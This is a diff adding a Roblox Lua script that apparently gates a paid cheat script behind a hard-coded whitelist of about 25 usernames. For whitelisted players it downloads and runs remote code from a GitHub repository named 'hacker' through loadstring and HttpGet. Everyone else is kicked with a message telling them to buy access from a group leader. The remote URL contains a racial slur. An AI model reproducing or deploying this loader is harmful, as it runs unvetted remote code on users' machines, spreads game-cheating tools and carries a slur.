@@ -1,0 +1,67 @@
+game:GetService("StarterGui"):SetCore("SendNotification", { 
+	Title = "罗布义管专用脚本";
+	Text = "正在检查白名单";
+	Icon = "rbxthumb://type=Asset&id=17519696976&w=150&h=150"})
+Duration = 15
+repeat
+task.wait(10)
+until game.Players.LocalPlayer.Character~=nil;
+local a=tostring(game.Players.LocalPlayer.Character);
+if a=="qpalzm10242"then
+_G.whitelisted=true
+elseif a=="666amns86"then
+_G.whitelisted=true
+elseif a=="2546ee9"then
+_G.whitelisted=true
+elseif a=="CN_sbdsb"then
+_G.whitelisted=true
+elseif a=="123qeerty5444"then
+_G.whitelisted=true
+elseif a=="alqpzm014"then
+_G.whitelisted=true
+elseif a=="EEVEENOT_Human"then
+_G.whitelisted=true
+elseif a=="147258mn33"then
+_G.whitelisted=true
+elseif a=="sggsh047"then
+_G.whitelisted=true
+elseif a=="shianbushiang3"then
+_G.whitelisted=true
+elseif a=="xmxbk2"then
+_G.whitelisted=true
+elseif a=="yui1236987450q"then
+_G.whitelisted=true
+elseif a=="147258mn2"then
+_G.whitelisted=true
+elseif a=="AUTUMN"then
+_G.whitelisted=true
+elseif a=="hdjvf92"then
+_G.whitelisted=true
+elseif a=="LiuHanDou"then
+_G.whitelisted=true
+elseif a=="IOEV54366"then
+_G.whitelisted=true
+elseif a=="qwaer81"then
+_G.whitelisted=true
+elseif a=="REQ906"then
+_G.whitelisted=true
+elseif a=="BrathBrubb6"then
+_G.whitelisted=true
+elseif a=="EODG_8"then
+_G.whitelisted=true
+elseif a=="147258mn657"then
+_G.whitelisted=true
+elseif a=="666amns87"then
+_G.whitelisted=true
+elseif a=="dddxvtdjxnr8"then
+_G.whitelisted=true
+elseif a=="666amns85"then
+end
+if _G.whitelisted==true then
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/asehbzi/hacker/refs/heads/main/niggerfuck"))()
+    
+else
+
+game.Players.LocalPlayer:Kick(a.."找罗布义管团团长买")
+end
